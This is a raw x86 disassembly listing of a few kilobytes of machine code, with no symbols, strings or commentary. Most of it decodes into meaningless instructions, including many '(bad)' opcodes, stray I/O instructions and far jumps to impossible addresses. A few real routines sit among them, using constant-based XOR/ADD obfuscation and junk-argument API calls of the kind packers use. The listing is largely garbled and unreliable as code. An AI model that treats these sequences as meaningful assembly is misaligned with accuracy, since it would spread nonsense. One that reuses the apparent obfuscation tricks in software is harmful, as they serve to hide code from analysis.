  4108aa:	ja     0x410833
  4108ac:	sub    al,0x60
  4108ae:	inc    eax
  4108af:	mov    eax,ds:0x9875e014
  4108b4:	in     eax,dx
  4108b5:	into   
  4108b6:	sbb    eax,0xec447011
  4108bb:	(bad)  
  4108bc:	fidiv  DWORD PTR [ecx]
  4108be:	fisub  DWORD PTR [ecx+0x3b75456f]
  4108c4:	lods   al,BYTE PTR ds:[esi]
  4108c5:	jmp    0x410870
  4108c7:	imul   ebx,DWORD PTR [edx],0xc9225455
  4108cd:	cmp    eax,esp
  4108cf:	jno    0x41093f
  4108d1:	es (bad) 
  4108d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108d5:	add    al,0x33
  4108d7:	mul    BYTE PTR [edx-0x44d8026a]
  4108dd:	xor    ah,bl
  4108df:	add    eax,0xd2c6fb2c
  4108e4:	enter  0x2323,0xfd
  4108e8:	aaa    
  4108e9:	ja     0x4108fd
  4108eb:	loop   0x4108dc
  4108ed:	mov    bh,0x5a
  4108ef:	or     eax,0x8ab8f1dd
  4108f4:	xchg   BYTE PTR [ebx-0x62],cl
  4108f7:	inc    edi
  4108f8:	(bad)  
  4108fa:	ins    BYTE PTR es:[edi],dx
  4108fb:	lods   eax,DWORD PTR ds:[esi]
  4108fc:	inc    esi
  4108fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108fe:	jno    0x410974
  410900:	rol    DWORD PTR [ebx+0x626aaf75],1
  410906:	sbb    dh,BYTE PTR [eax-0x40ba4f79]
  41090c:	retf   0xe2fb
  41090f:	(bad)  
  410910:	jg     0x4108d0
  410912:	pop    ebp
  410913:	sub    eax,0x6773674b
  410918:	stc    
  410919:	pop    esi
  41091a:	outs   dx,BYTE PTR ds:[esi]
  41091b:	pusha  
  41091c:	and    ecx,esi
  41091e:	xor    dl,BYTE PTR [eax]
  410920:	add    BYTE PTR [esp+edx*4-0x172a8048],bl
  410927:	jns    0x41090e
  410929:	sub    al,0x94
  41092b:	mov    DWORD PTR [edx-0x670dda2],ebx
  410931:	mov    edx,0x577835cf
  410936:	xlat   BYTE PTR ds:[ebx]
  410937:	xor    bl,ch
  410939:	jbe    0x4108e1
  41093b:	jbe    0x410927
  41093d:	xor    eax,0x5d25d796
  410942:	cld    
  410943:	mov    edx,0xa7d261f4
  410948:	cmp    edi,DWORD PTR [edx+0x17164b37]
  41094e:	pop    ecx
  41094f:	mov    eax,ds:0xc91d5588
  410954:	sub    DWORD PTR ds:0x311830f,0xffffffc1
  41095b:	cmp    DWORD PTR [esi+0x54],eax
  41095e:	pop    esi
  41095f:	je     0x41096d
  410965:	mov    eax,DWORD PTR [ebp+0x8]
  410968:	jmp    0x410986
  41096d:	mov    eax,DWORD PTR [ebp-0x4]
  410970:	xor    eax,edx
  410972:	add    eax,ecx
  410974:	jmp    0x410986
  410979:	mov    eax,DWORD PTR [ebp-0x4]
  41097c:	xor    eax,0x7510851
  410981:	add    eax,0x327299
  410986:	leave  
  410987:	ret    0x4
  41098a:	push   ebp
  41098b:	mov    ebp,esp
  41098d:	push   ecx
  41098e:	mov    ecx,DWORD PTR [ebp+0x8]
  410991:	and    DWORD PTR ds:0x4345ef,0x0
  41099b:	mov    eax,ds:0x4345ef
  4109a0:	inc    eax
  4109a1:	mov    ds:0x4345ef,eax
  4109a6:	cmp    DWORD PTR ds:0x4345ef,0x9
  4109ad:	jne    0x4109c9
  4109b3:	push   0x61e9
  4109b8:	push   DWORD PTR [ebp-0x28]
  4109bb:	push   DWORD PTR [ebp-0x28]
  4109be:	push   0x6f4e
  4109c3:	call   DWORD PTR ds:0x4132a8
  4109c9:	cmp    DWORD PTR ds:0x4345ef,0x8
  4109d0:	jne    0x4109e1
  4109d6:	mov    eax,ds:0x4345ef
  4109db:	inc    eax
  4109dc:	mov    ds:0x4345ef,eax
  4109e1:	cmp    DWORD PTR ds:0x4345ef,0x17
  4109e8:	jb     0x41099b
  4109ee:	movzx  eax,BYTE PTR ds:0x4346cf
  4109f5:	adc    DWORD PTR ds:0x4345e3,eax
  4109fb:	mov    eax,0x7510851
  410a00:	and    DWORD PTR ds:0x4346bb,0x46b5
  410a0a:	xor    ecx,eax
  410a0c:	add    ecx,0x327299
  410a12:	mov    DWORD PTR ds:0x434607,0x530c
  410a1c:	jmp    0x410cd8
  410a21:	cmp    eax,0x7d22e5f8
  410a26:	arpl   bp,di
  410a28:	mov    DWORD PTR [ebx+0x2d],esp
  410a2b:	arpl   di,bp
  410a2d:	sub    al,BYTE PTR [esi-0xe]
  410a30:	and    DWORD PTR [edx-0x628181be],ebp
  410a36:	js     0x410ab6
  410a38:	jle    0x410a38
  410a3a:	xchg   esp,eax
  410a3b:	pop    ebx
  410a3c:	sbb    BYTE PTR [ebx],ch
  410a3e:	cld    
  410a3f:	add    ebp,DWORD PTR [ebx-0x3efc6aa7]
  410a45:	dec    ecx
  410a46:	cmp    ch,0xfb
  410a49:	push   0xfffffff6
  410a4b:	xor    eax,0xeecd0a84
  410a50:	mov    DWORD PTR [edi+0x28c348ee],eax
  410a56:	push   eax
  410a57:	lock mov bh,0x24
  410a5a:	mov    esi,0x6621ed2a
  410a5f:	push   ecx
  410a60:	int3   
  410a61:	sub    DWORD PTR [esi+0x69308380],eax
  410a67:	sbb    BYTE PTR [esi+0x39],0x4e
  410a6b:	aas    
  410a6c:	mov    dl,0xf9
  410a6e:	leave  
  410a6f:	cmp    DWORD PTR [eax+0x10ca364],ecx
  410a75:	push   edx
  410a76:	rcr    ecx,0x6c
  410a79:	jl     0x410a19
  410a7b:	or     edx,DWORD PTR [ecx-0x11]
  410a7e:	test   bh,ah
  410a80:	cmc    
  410a81:	iret   
  410a82:	neg    ch
  410a84:	jbe    0x410afd
  410a86:	and    ch,0x2d
  410a89:	xor    ecx,edx
  410a8b:	jge    0x410ab4
  410a8d:	pop    edx
  410a8e:	jmp    0x410af9
  410a90:	mov    edx,0xdb72c9e9
  410a95:	imul   esi,DWORD PTR [eax+0x19],0x36
  410a99:	adc    esi,DWORD PTR [edx]
  410a9b:	cli    
  410a9c:	push   esi
  410a9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a9e:	lods   al,BYTE PTR ds:[esi]
  410a9f:	mov    ah,0x46
  410aa1:	pop    es
  410aa2:	push   edi
  410aa3:	dec    ebp
  410aa4:	pop    ds
  410aa5:	imul   DWORD PTR [edi]
  410aa7:	inc    esi
  410aa8:	loope  0x410a48
  410aaa:	pop    ebx
  410aab:	repnz fst DWORD PTR [eax-0xb]
  410aaf:	sbb    BYTE PTR [ecx],cl
  410ab1:	(bad)  
  410ab2:	aam    0xa9
  410ab4:	call   0xa996c521
  410ab9:	jmp    0x410b2f
  410abb:	pop    edi
  410abc:	add    bh,BYTE PTR [ebx]
  410abe:	das    
  410abf:	pushw  cs
  410ac1:	out    dx,al
  410ac2:	imul   edx,DWORD PTR [ecx+0x5d],0x4d
  410ac6:	xchg   esi,eax
  410ac7:	jns    0x410adf
  410ac9:	mov    eax,0xe93fcc4d
  410ace:	and    al,0xe6
  410ad0:	sub    bh,BYTE PTR [ecx]
  410ad2:	loope  0x410ae6
  410ad4:	(bad)  
  410ad5:	mov    esi,0xcc68a5ed
  410ada:	sti    
  410adb:	scas   al,BYTE PTR es:[edi]
  410adc:	mov    eax,ds:0x5a2ba23
  410ae1:	cs add al,0xb9
  410ae4:	pop    es
  410ae5:	xor    ch,BYTE PTR [ebx-0x51a7092d]
  410aeb:	sar    BYTE PTR [edx+0x4b4ed679],cl
  410af1:	lods   al,BYTE PTR ds:[esi]
  410af2:	pop    esp
  410af3:	jnp    0x410b42
  410af5:	ins    DWORD PTR es:[edi],dx
  410af6:	lods   al,BYTE PTR ds:[esi]
  410af7:	jne    0x410ae6
  410af9:	xor    bl,BYTE PTR [edi]
  410afb:	retf   
  410afc:	(bad)  
  410afe:	adc    BYTE PTR [ecx+0x5a],al
  410b01:	lds    edi,FWORD PTR [ebp-0x3]
  410b04:	in     eax,0xe8
  410b06:	mov    al,fs:0x8ee8c0f1
  410b0c:	ja     0x410ab9
  410b0e:	stc    
  410b0f:	cmp    al,0x0
  410b12:	rol    BYTE PTR [eax+0x584f17bf],0xbe
  410b19:	xor    BYTE PTR [ebp+0x54],bh
  410b1c:	loopne 0x410b60
  410b1e:	gs xchg edi,eax
  410b20:	jmp    0xbab54961
  410b25:	stos   BYTE PTR es:[edi],al
  410b26:	imul   esp,DWORD PTR [edx+eax*8],0x54562068
  410b2d:	pop    edi
  410b2e:	mov    ds:0xf3db93c5,al
  410b33:	mov    cl,0xf2
  410b35:	pop    ebp
  410b36:	inc    eax
  410b37:	dec    esi
  410b38:	mov    cl,0xdd
  410b3a:	xchg   edx,eax
  410b3b:	(bad)  
  410b3c:	and    bh,ch
  410b3e:	ins    BYTE PTR es:[edi],dx
  410b3f:	pusha  
  410b40:	push   0xe5445063
  410b45:	sbb    eax,DWORD PTR [ecx]
  410b47:	jb     0x410baf
  410b49:	rol    al,1
  410b4b:	shl    DWORD PTR [ecx+0x5626275e],1
  410b51:	adc    BYTE PTR [edx],dl
  410b53:	das    
  410b54:	or     al,0x1
  410b56:	xor    al,0xf2
  410b58:	push   0x56
  410b5a:	int3   
  410b5b:	xor    bl,BYTE PTR [edx+ecx*4+0x6c255859]
  410b62:	inc    esi
  410b63:	mov    cl,0xf6
  410b65:	push   esp
  410b66:	sub    eax,DWORD PTR [ebx]
  410b68:	fwait
  410b69:	add    esi,DWORD PTR [edi+0x13]
  410b6c:	stc    
  410b6d:	out    dx,eax
  410b6e:	adc    al,0xb8
  410b70:	push   0x7
  410b72:	ja     0x410bea
  410b74:	push   edx
  410b75:	aad    0xf8
  410b77:	pop    edx
  410b78:	mov    esi,0x137035d0
  410b7d:	adc    eax,0x549dd69a
  410b82:	mov    ch,0x31
  410b84:	push   edx
  410b85:	jnp    0x410bed
  410b87:	adc    BYTE PTR [esi-0x58],ah
  410b8a:	mov    ah,BYTE PTR [edi]
  410b8c:	leave  
  410b8d:	repnz clc 
  410b8f:	leave  
  410b90:	xchg   ebp,eax
  410b91:	mov    bl,0x42
  410b93:	rol    ebp,0x39
  410b96:	jl     0x410bde
  410b98:	sbb    eax,0x531f9188
  410b9d:	call   0xd981199e
  410ba2:	aaa    
  410ba3:	and    DWORD PTR [ebx],esp
  410ba5:	dec    ecx
  410ba6:	in     al,0x8
  410ba8:	push   eax
  410ba9:	fst    QWORD PTR [eax+0x7b]
  410bac:	ins    BYTE PTR es:[edi],dx
  410bad:	mov    bh,0x29
  410baf:	xchg   BYTE PTR [esi-0x6b],ah
  410bb2:	dec    eax
  410bb3:	outs   dx,BYTE PTR ds:[esi]
  410bb4:	cmp    BYTE PTR [ebp-0x2e],dh
  410bb7:	dec    ebp
  410bb8:	sbb    al,0xb9
  410bba:	and    cl,dh
  410bbc:	jne    0x410ba1
  410bbe:	sub    al,0xa9
  410bc0:	icebp  
  410bc1:	and    BYTE PTR es:[eax-0x4b016372],al
  410bc8:	fnstenv [ecx+0x30]
  410bcb:	ret    
  410bcc:	mov    DWORD PTR [esi],esp
  410bce:	addr16 in al,dx
  410bd0:	cwde   
  410bd1:	xor    esp,DWORD PTR [eax+0x9]
  410bd4:	fnstcw WORD PTR [edi]
  410bd6:	arpl   WORD PTR [ebx+0x57d484cb],dx
  410bdc:	add    eax,0xd75b84e6
  410be1:	dec    ecx
  410be2:	mov    edi,esi
  410be4:	dec    ebx
  410be5:	ins    BYTE PTR es:[edi],dx
  410be6:	jmp    FWORD PTR ds:0xa9a92451
  410bec:	sbb    ecx,esp
  410bee:	inc    ebp
  410bef:	loope  0x410c2c
  410bf1:	pop    ss
  410bf2:	pop    ecx
  410bf3:	clc    
  410bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bf5:	pop    ss
  410bf6:	xchg   esp,eax
  410bf7:	push   eax
  410bf8:	mov    ebp,0x88c4600f
  410bfd:	or     cl,BYTE PTR [ebp+0x5c09d6c0]
  410c03:	push   es
  410c04:	and    BYTE PTR es:[bx],cl
  410c08:	mov    cl,0x97
  410c0a:	xchg   esp,eax
  410c0b:	inc    DWORD PTR [eax+0x56]
  410c0e:	retf   
  410c0f:	dec    ebp
  410c10:	retf   
  410c11:	sub    BYTE PTR [ecx+0x10],ah
  410c14:	add    edx,esi
  410c16:	(bad)  
  410c17:	xrelease mov DWORD PTR [ebx-0x2acc2ed4],edi
  410c1e:	(bad)  [edx+0x3d14c268]
  410c24:	cld    
  410c25:	adc    ebp,DWORD PTR [edi-0x1cd31ff5]
  410c2b:	xor    ah,cl
  410c2d:	out    dx,eax
  410c2e:	dec    edi
  410c2f:	hlt    
  410c30:	dec    eax
  410c31:	lds    esi,FWORD PTR [esi+0x2d]
  410c34:	xor    DWORD PTR [esi+0x18b668cf],ecx
  410c3a:	mov    ebp,0x9d39b707
  410c3f:	daa    
  410c40:	add    DWORD PTR [edi*8-0x788e85d6],0xc8d2b701
  410c4b:	loope  0x410c55
  410c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c4e:	arpl   sp,dx
  410c50:	lahf   
  410c51:	cmc    
  410c52:	jg     0x410cc4
  410c54:	sti    
  410c55:	and    eax,ecx
  410c57:	inc    edx
  410c58:	dec    BYTE PTR [eax+0xb70b411]
  410c5e:	daa    
  410c5f:	or     DWORD PTR [esi-0x35],0x46
  410c63:	sti    
  410c64:	push   0xc
  410c66:	cmp    ebp,esp
  410c68:	dec    ecx
  410c69:	cmp    BYTE PTR [edx-0x3fc3d21],al
  410c6f:	sbb    DWORD PTR [ebp+esi*1+0x19],ecx
  410c73:	test   DWORD PTR [ebp*2+0x5d57eb56],0x7e8b3ba9
  410c7e:	xor    eax,0x497bd16e
  410c83:	test   DWORD PTR [edx+0x4d],edx
  410c86:	cmp    DWORD PTR [edx-0x14],0xffffffbc
  410c8a:	mov    ecx,0xd8a98e07
  410c8f:	push   ecx
  410c90:	jg     0x410c1f
  410c92:	adc    DWORD PTR cs:[ebx+0x36],ecx
  410c96:	xchg   esp,eax
  410c97:	lods   eax,DWORD PTR ds:[esi]
  410c98:	(bad)  
  410c99:	pop    ebx
  410c9a:	inc    ebp
  410c9b:	(bad)  
  410c9d:	mov    bh,0x53
  410c9f:	stc    
  410ca0:	scas   al,BYTE PTR es:[edi]
  410ca1:	out    dx,al
  410ca2:	pop    esi
  410ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ca4:	mov    cl,0x2c
  410ca6:	not    DWORD PTR [edi+esi*4-0x71]
  410caa:	inc    ebx
  410cab:	loopne 0x410d1b
  410cad:	fs (bad) 
  410caf:	push   esi
  410cb0:	pop    ss
  410cb1:	jl     0x410c40
  410cb3:	call   0x79f4d979
  410cb8:	and    ebp,DWORD PTR [ebx]
  410cba:	mul    bl
  410cbc:	mov    BYTE PTR [ebp+ebx*8+0xe4aad25],cl
  410cc3:	jns    0x410c8e
  410cc5:	repnz cmp eax,0x84b55ae0
  410ccb:	loope  0x410c95
  410ccd:	fcmovnb st,st(6)
  410ccf:	out    0x6,eax
  410cd1:	inc    ebp
  410cd2:	inc    esi
  410cd3:	and    ch,bl
  410cd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd6:	mov    ah,0xce
  410cd8:	mov    DWORD PTR [ebp+0x10],ecx
  410cdb:	mov    ecx,DWORD PTR ds:0x4346c7
  410ce1:	mov    DWORD PTR [ebp+0x8],0xf34ceba
  410ce8:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  410cef:	mov    ecx,DWORD PTR ds:0x4345e3
  410cf5:	mov    ecx,0xf89c8539
  410cfa:	push   esi
  410cfb:	mov    DWORD PTR [ebp+0x10],0x70019f8
  410d02:	mov    DWORD PTR ds:0x43470b,edx
  410d08:	mov    esi,DWORD PTR [ebp-0x4]
  410d0b:	cmp    ecx,esi
  410d0d:	mov    DWORD PTR ds:0x434713,0x165f
  410d17:	je     0x411018
  410d1d:	mov    esi,DWORD PTR [ebp+0xc]
  410d20:	xor    ecx,eax
  410d22:	sub    DWORD PTR ds:0x4346c7,0x434683
  410d2c:	xor    esi,eax
  410d2e:	xor    DWORD PTR ds:0x434707,0x6bfa
  410d38:	lea    ecx,[esi+ecx*1+0x327299]
  410d3f:	xor    ecx,eax
  410d41:	cmp    ecx,0xf89c8526
  410d47:	jne    0x410cfb
  410d4d:	mov    DWORD PTR ds:0x43468f,0x7d20
  410d57:	jmp    0x411302
  410d5c:	jmp    0x411018
  410d61:	inc    ebp
  410d62:	lods   al,BYTE PTR ds:[esi]
  410d63:	xchg   DWORD PTR [ebx],ebx
  410d65:	addr16 and eax,0xe5906c6d
  410d6b:	mov    DWORD PTR [ebx-0xecbc96b],esi
  410d71:	leave  
  410d72:	dec    ebp
  410d73:	jle    0x410df3
  410d75:	popf   
  410d76:	js     0x410df6
  410d78:	jle    0x410ddc
  410d7a:	mov    ds:0x1d877eb2,eax
  410d7f:	mov    eax,ds:0xe451eda8
  410d84:	ror    ebp,1
  410d86:	pop    ebp
  410d87:	or     eax,0x84773130
  410d8c:	push   0xffffffad
  410d8e:	cld    
  410d8f:	bound  eax,QWORD PTR [eax+edx*4]
  410d92:	xchg   esp,eax
  410d93:	mov    ebx,0xd03e8e29
  410d98:	js     0x410da5
  410d9a:	pop    ds
  410d9b:	cmp    al,0x50
  410d9d:	dec    ecx
  410d9e:	jp     0x410df2
  410da0:	aam    0xe7
  410da2:	cmc    
  410da3:	in     eax,0x50
  410da5:	mov    eax,DWORD PTR [edi-0x5e]
  410da8:	adc    edi,esi
  410daa:	jb     0x410e2b
  410dac:	mov    al,ds:0xccf9f00e
  410db1:	mov    esp,0x7b7e32c8
  410db6:	jle    0x410dae
  410db8:	js     0x410e1f
  410dba:	adc    DWORD PTR [esi],ebp
  410dbc:	lock fdiv DWORD PTR [edx+0x10e8fb4d]
  410dc3:	(bad)  
  410dc4:	xchg   esp,eax
  410dc5:	jmp    0xffd3:0x6f9d1291
  410dcc:	inc    edx
  410dcd:	int    0xfa
  410dcf:	outs   dx,DWORD PTR ds:[esi]
  410dd0:	or     DWORD PTR [ebp-0x31],esi
  410dd3:	imul   edx,esp,0x1b
  410dd6:	pop    eax
  410dd7:	pop    eax
  410dd8:	shr    eax,cl
  410dda:	pop    ecx
  410ddb:	stos   BYTE PTR es:[edi],al
  410ddc:	mov    ebp,0x6738746b
  410de1:	nop
  410de2:	mov    ?,WORD PTR [ebp+0x4]
  410de5:	jo     0x410e02
  410de7:	xor    eax,0x8e514e72
  410dec:	xchg   ebx,eax
  410ded:	enter  0x2ed8,0xce
  410df1:	in     eax,0x30
  410df3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410df4:	and    BYTE PTR [ebx+0x429ee88c],dl
  410dfa:	cmp    ebx,DWORD PTR [esi]
  410dfc:	sbb    al,0x4d
  410dfe:	or     BYTE PTR [edi],dl
  410e00:	cmc    
  410e01:	dec    ebx
  410e02:	sbb    DWORD PTR [ecx-0x3e],esi
  410e05:	test   al,0x1f
  410e07:	ss sbb esi,edx
  410e0a:	sub    BYTE PTR [ebx+0x45],ch
  410e0d:	xrelease mov DWORD PTR [edx],eax
  410e10:	jns    0x410e1e
  410e12:	push   cs
  410e13:	loop   0x410e55
  410e15:	fwait
  410e16:	imul   ecx,DWORD PTR [ecx+0x33a74b06],0x5118ee
  410e20:	mov    edx,0x17c3fb3f
  410e25:	pop    edx
  410e26:	add    BYTE PTR [ebx+ebp*4],cl
  410e29:	les    esi,FWORD PTR [ebp+eax*2+0x18]
  410e2d:	cmp    dl,bh
  410e2f:	xchg   ebx,eax
  410e30:	jp     0x410e62
  410e32:	cmp    BYTE PTR [edx+0x4d],ch
  410e35:	dec    edi
  410e36:	cmp    BYTE PTR [esi],dl
  410e38:	mov    edx,0x3bf95abc
  410e3d:	push   0x1c01fa41
  410e42:	sbb    BYTE PTR [eax+eiz*8+0x2cf57047],0x87
  410e4a:	mov    bl,0xd7
  410e4c:	sbb    ah,BYTE PTR [edx]
  410e4e:	aas    
  410e4f:	(bad)  
  410e50:	push   cs
  410e51:	jg     0x410e2d
  410e53:	fisttp DWORD PTR cs:[bx+di-0x2c]
  410e58:	xor    BYTE PTR [esi-0x50bf6303],dl
  410e5e:	mov    bh,0xb
  410e60:	arpl   bx,bx
  410e62:	in     eax,0x1f
  410e64:	dec    edx
  410e65:	lods   al,BYTE PTR ds:[esi]
  410e66:	mov    WORD PTR [esi],es
  410e68:	cmp    DWORD PTR [ebp-0x34],0xffffff8b
  410e6c:	jle    0x410ee6
  410e6e:	mov    al,0xe6
  410e70:	in     eax,0x13
  410e72:	add    esi,DWORD PTR [edi+0x4e]
  410e75:	or     dl,dl
  410e77:	sbb    eax,0x19c22723
  410e7c:	ret    
  410e7d:	or     eax,0xd43a2984
  410e82:	dec    ebx
  410e83:	push   edi
  410e84:	fwait
  410e85:	scas   al,BYTE PTR es:[edi]
  410e86:	jno    0x410e45
  410e88:	adc    dl,al
  410e8a:	scas   eax,DWORD PTR es:[edi]
  410e8b:	and    al,0xaf
  410e8d:	stc    
  410e8e:	or     BYTE PTR [ebx+0x5df6e3ec],bh
  410e94:	das    
  410e95:	in     eax,0x21
  410e97:	pushf  
  410e98:	lock add DWORD PTR [ecx+0xb],0xe4932623
  410ea0:	enter  0x642f,0x35
  410ea4:	aas    
  410ea5:	cwde   
  410ea6:	leave  
  410ea7:	and    DWORD PTR [ebx+0x5f],ebp
  410eaa:	sbb    eax,0x75707494
  410eaf:	xchg   ecx,eax
  410eb0:	ja     0x410ea7
  410eb2:	scas   al,BYTE PTR es:[edi]
  410eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eb4:	mov    ah,0xc1
  410eb6:	mov    al,0x68
  410eb8:	cdq    
  410eb9:	lock mov dl,cl
  410ebc:	jbe    0x410e85
  410ebe:	adc    BYTE PTR [eax+0x12926d3c],dl
  410ec4:	add    dl,ch
  410ec6:	xchg   ecx,eax
  410ec7:	repnz push ss
  410ec9:	lods   al,BYTE PTR ds:[esi]
  410eca:	out    dx,eax
  410ecb:	(bad)  
  410ecc:	fmul   DWORD PTR [edx-0x4ecfc9ca]
  410ed2:	test   al,0x21
  410ed4:	pop    ebp
  410ed5:	mov    ds:0xdfc4e4f2,al
  410eda:	stc    
  410edb:	push   esi
  410edc:	lock into 
  410ede:	mov    ds:0x8bfb0bbf,al
  410ee3:	ret    0x4116
  410ee6:	(bad)  
  410ee7:	imul   edx,DWORD PTR [ebp+0x1e7793d3],0xffffffc9
  410eee:	(bad)  
  410eef:	(bad)  
  410ef0:	aaa    
  410ef1:	pusha  
  410ef2:	add    BYTE PTR [eax+0x2d],0xc3
  410ef6:	pop    esi
  410ef7:	shl    ebp,0x50
  410efa:	or     BYTE PTR [ebx+0x32],ah
  410efd:	sti    
  410efe:	pop    eax
  410eff:	jae    0x410e84
  410f01:	and    dl,BYTE PTR [eax+0x5e9d8e4f]
  410f07:	out    dx,al
  410f08:	mov    edi,0x130431c1
  410f0d:	xchg   esi,eax
  410f0e:	out    0x31,al
  410f10:	pop    ss
  410f11:	push   ebx
  410f12:	addr16 stc 
  410f14:	popf   
  410f15:	inc    edi
  410f16:	imul   esi,DWORD PTR [ebp-0x62f5c1b8],0x83195431
  410f20:	pop    edi
  410f21:	jne    0x410f89
  410f23:	pusha  
  410f24:	rol    BYTE PTR [esi+0x33],1
  410f27:	(bad)  
  410f28:	mov    ah,0xdb
  410f2a:	adc    eax,0x1e9f0adc
  410f2f:	inc    DWORD PTR [esi]
  410f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f32:	call   0x4e72f24b
  410f37:	adc    al,0x65
  410f39:	add    esp,ecx
  410f3b:	fdivr  QWORD PTR [ebp-0x69d4dcc8]
  410f41:	dec    edi
  410f42:	add    dh,bl
  410f44:	or     BYTE PTR [ebx+0x502843b6],ch
  410f4a:	stos   BYTE PTR es:[edi],al
  410f4b:	je     0x410f23
  410f4d:	jnp    0x410f92
  410f4f:	xchg   esi,eax
  410f50:	pop    esp
  410f51:	push   0xffffff8b
  410f53:	call   0x98b9:0xafbfaea6
  410f5a:	or     ah,dh
  410f5c:	add    al,BYTE PTR [ecx-0x7c417c35]
  410f62:	repnz fisttp WORD PTR [ebx+eiz*1]
  410f66:	jg     0x410f2b
  410f68:	dec    esi
  410f69:	mov    cl,0x12
  410f6b:	pop    es
  410f6c:	push   eax
  410f6d:	bound  edi,QWORD PTR [esi]
  410f6f:	add    dh,al
  410f71:	out    dx,eax
  410f72:	mov    BYTE PTR [eax+0x46],0xa8
  410f76:	fchs   
  410f78:	mov    edi,0xd0e4c301
  410f7d:	int    0xac
  410f7f:	mov    ah,0x71
  410f81:	shl    BYTE PTR [edi],0x69
  410f84:	sbb    DWORD PTR ds:0x6e1a5bcc,edi
  410f8a:	dec    ebp
  410f8b:	xor    al,0xdc
  410f8d:	loope  0x410fca
  410f8f:	cld    
  410f90:	test   DWORD PTR [ecx],esi
  410f92:	xor    eax,0x19e2bc52
  410f97:	dec    eax
  410f98:	shl    DWORD PTR [edx-0x23],1
  410f9b:	in     al,0x5d
  410f9d:	in     al,0x46
  410f9f:	sbb    al,0x26
  410fa1:	sbb    eax,0xa537b94a
  410fa6:	test   DWORD PTR [esi-0x1c],0x265f1f4d
  410fad:	add    al,0xfe
  410faf:	mov    ebx,0xfddd950c
  410fb4:	les    edi,FWORD PTR [edx+0x37a48557]
  410fba:	mov    ecx,fs
  410fbc:	loopne 0x41102c
  410fbe:	and    BYTE PTR [ebx+0x7e],ah
  410fc1:	dec    ebx
  410fc2:	xchg   esp,eax
  410fc3:	dec    ebx
  410fc4:	enter  0x312c,0xe3
  410fc8:	ror    BYTE PTR [ecx],0x91
  410fcb:	and    BYTE PTR [ebx+0x3],ah
  410fce:	add    esp,DWORD PTR [edx-0x53]
  410fd1:	jl     0x410fb6
  410fd3:	mov    bh,0x7b
  410fd5:	push   esi
  410fd6:	jecxz  0x411050
  410fd8:	mov    al,ds:0x248acbb5
  410fdd:	ret    0xdc55
  410fe0:	adc    DWORD PTR [edx+0x716a6b85],ebx
  410fe6:	hlt    
  410fe7:	jp     0x411014
  410fe9:	pop    ebx
  410fea:	cmp    cl,BYTE PTR [ecx-0x1483dfca]
  410ff0:	sbb    edx,edi
  410ff2:	in     eax,dx
  410ff3:	pop    ss
  410ff4:	and    DWORD PTR ds:0x5738d73f,0xffffffde
  410ffb:	retf   
  410ffc:	adc    edi,DWORD PTR [edx-0x6e824b6a]
  411002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411003:	xchg   edi,eax
  411004:	mov    gs:0xffe09071,eax
  41100a:	in     al,0x64
  41100c:	push   ebp
  41100d:	inc    edi
  41100e:	jnp    0x410fa1
  411010:	sub    bh,ah
  411012:	pop    es
  411013:	lsl    edx,WORD PTR [ebx]
  411016:	adc    ebx,DWORD PTR [esi-0x72983e7f]
  41101c:	int    0xff
  41101e:	mov    esi,ecx
  411020:	xor    esi,eax
  411022:	add    esi,DWORD PTR [ebp+0x8]
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0x75264754
  411040:	sbb    DWORD PTR ss:[eax+0x4f],ebp
  411044:	jle    0x4110c4
  411046:	popf   
  411047:	js     0x4110c7
  411049:	jle    0x411054
  41104b:	dec    edx
  41104c:	scas   al,BYTE PTR es:[edi]
  41104d:	addr16 mov edi,0x27e7e91f
  411053:	shl    BYTE PTR [ecx-0x7e],1
  411056:	sbb    BYTE PTR [ebx-0x53],ah
  411059:	adc    BYTE PTR [eax-0x6e],ch
  41105c:	sbb    BYTE PTR [edx+0x3dfbe344],bh
  411062:	je     0x411084
  411064:	adc    ebp,DWORD PTR [edi-0x55]
  411067:	push   ss
  411068:	pop    eax
  411069:	add    ebx,edi
  41106b:	jp     0x411054
  41106d:	xor    ah,BYTE PTR [ecx+0x77ed6680]
  411073:	pop    ecx
  411074:	mov    ch,0xd1
  411076:	push   ecx
  411077:	fmul   st(4),st
  411079:	cmp    BYTE PTR [ecx-0x3d],al
  41107c:	mov    dh,0xdf
  41107e:	and    ch,BYTE PTR [ecx-0x29]
  411081:	in     al,dx
  411082:	and    esi,ebx
  411084:	dec    eax
  411085:	aad    0x9
  411087:	and    al,0x87
  411089:	pop    ebx
  41108a:	scas   eax,DWORD PTR es:[edi]
  41108b:	fwait
  41108c:	cmp    edi,esi
  41108e:	fist   DWORD PTR [edi-0x7b59028e]
  411094:	mov    BYTE PTR [eax+0x58],0x3c
  411098:	sbb    BYTE PTR [ebx+0x16],0xbd
  41109c:	cwde   
  41109d:	dec    ebx
  41109e:	pop    ebx
  41109f:	call   0x648760d
  4110a4:	in     eax,dx
  4110a5:	clc    
  4110a6:	pop    ecx
  4110a7:	pop    es
  4110a8:	in     al,dx
  4110a9:	adc    BYTE PTR [eax+0x7db4e73d],al
  4110af:	jno    0x411127
  4110b1:	sbb    eax,0x5bdd02e9
  4110b6:	lock mov esi,0x214dacb3
  4110bc:	mov    ebp,DWORD PTR [ebx]
  4110be:	shl    DWORD PTR [edi],cl
  4110c0:	rcl    DWORD PTR [esi-0x30f15883],1
  4110c6:	lea    ebx,[ecx]
  4110c8:	(bad)  
  4110c9:	adc    BYTE PTR [ebx+0x6d],ah
  4110cc:	pop    ebx
  4110cd:	test   eax,0x3783dc50
  4110d2:	aaa    
